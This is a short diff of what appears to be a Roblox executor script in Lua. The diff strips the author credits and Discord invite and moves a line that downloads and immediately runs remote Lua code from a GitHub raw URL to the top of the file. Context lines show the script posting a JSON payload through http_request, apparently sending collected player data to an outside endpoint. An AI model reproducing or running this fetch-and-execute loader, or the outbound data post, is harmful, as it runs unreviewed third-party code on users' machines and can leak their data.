@@ -1,7 +1,4 @@
---[[ # Remake was made by skondoooo92
-	 # Discord server is: "https://discord.gg/4THYgrRQd3"
-	 # Join our server for more updates and information]]--
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -172,7 +169,3 @@ http_request({
     Headers = { ["Content-Type"] = "application/json" },
     Body    = HttpService:JSONEncode(payload)
 })
-
-task.wait(10)
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Roman34296589/SnapSanixHUB/refs/heads/main/SnapSanixHUB.lua'))()
